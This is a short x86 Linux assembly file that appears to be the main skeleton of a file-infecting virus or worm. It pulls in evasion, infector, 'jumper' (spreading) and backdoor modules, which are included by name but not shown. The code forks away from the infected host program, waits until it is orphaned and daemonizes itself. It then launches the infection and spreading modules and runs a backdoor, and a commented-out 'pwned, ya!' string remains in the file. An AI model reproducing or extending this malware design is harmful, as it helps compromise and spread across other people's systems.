section .text
	global _start
_start:
  __evasion:
	%include "evasion.asm"

	;fork()
	mov eax,2
	int 0x80
	cmp eax,0
	jne __runhost

	;fork()
	mov eax,2
	int 0x80
	cmp eax,0
	jne __die

__runE3:
  __checkppid:
	;getppid()
	mov eax,64
	int 0x80
	cmp eax,1
	jne __checkppid

	;umask(0)
	mov eax,60
	mov ebx,0
	int 0x80

	;setsid()
	mov eax,66
	int 0x80

	;close(0)
	mov eax,6
	mov ebx,0
	int 0x80

	;close(1)
	mov eax,6
	mov ebx,1
	int 0x80

	;close(2)
	mov eax,6
	mov ebx,2
	int 0x80

  ;STATUS
  ;daemonization complete
  ;fork and run modules

	;fork infector module
	;fork()
	mov eax,2
	int 0x80
	cmp eax,0
	je __infector

	;fork jumper module
	;fork()
	mov eax,2
	int 0x80
	cmp eax,0
	je __jumper

	;run backdoor
  __backdoor:
	%include "backdoor.asm"
	jmp __die
  __infector:
	%include "infector.asm"
	jmp __die
  __jumper:
	%include "jumper.asm"
	jmp __die

  __methods:
	;shared methods
	%include "socketcall.asm"

  __strings:
	;strings strings strings!
;   __MSG__:
;	call X__MSG__
;	db "pwned, ya!",10

__die:
	mov eax,1
	xor ebx,ebx
	int 0x80

__runhost:
	;waitpid(-1,0,0)
	mov eax,7
	mov ebx,-1
	xor ecx,ecx
	xor edx,edx
	int 0x80

	nop
